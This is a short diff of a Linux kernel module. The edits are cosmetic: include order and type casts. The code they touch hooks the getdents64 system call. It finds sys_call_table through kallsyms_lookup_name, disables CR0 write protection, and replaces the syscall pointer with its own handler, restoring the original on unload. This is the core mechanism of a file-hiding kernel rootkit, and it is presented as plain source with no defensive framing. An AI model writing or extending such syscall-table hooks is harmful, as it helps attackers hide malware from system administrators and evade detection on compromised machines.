@@ -2,8 +2,8 @@
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/dirent.h>
-#include <linux/uaccess.h>
 #include <linux/slab.h>
+#include <linux/uaccess.h>
 #include <stdbool.h>
 
 // Types & other consts.
@@ -74,9 +74,9 @@ int new_getdents64(const struct pt_regs *regs) {
 int load(void) {
     printk(KERN_ALERT "Initializing...");
     zero_cr0();
-    syscall_table = kallsyms_lookup_name("sys_call_table");
+    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
     original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
-    syscall_table[__NR_getdents64] = (long unsigned int)new_getdents64;
+    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
     printk(KERN_ALERT "Overrided getdents64 ptr!");
     one_cr0();
     printk(KERN_ALERT "Initialized successfuly!");
@@ -87,7 +87,7 @@ int load(void) {
 void unload(void) {
     printk(KERN_ALERT "Shutting down.");
     zero_cr0();
-    syscall_table[__NR_getdents64] = (long unsigned int)original_getdents64_ptr;  
+    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
     printk(KERN_ALERT "getdents64 has been restored!");
     one_cr0();
     printk(KERN_ALERT "Goodbye world...");
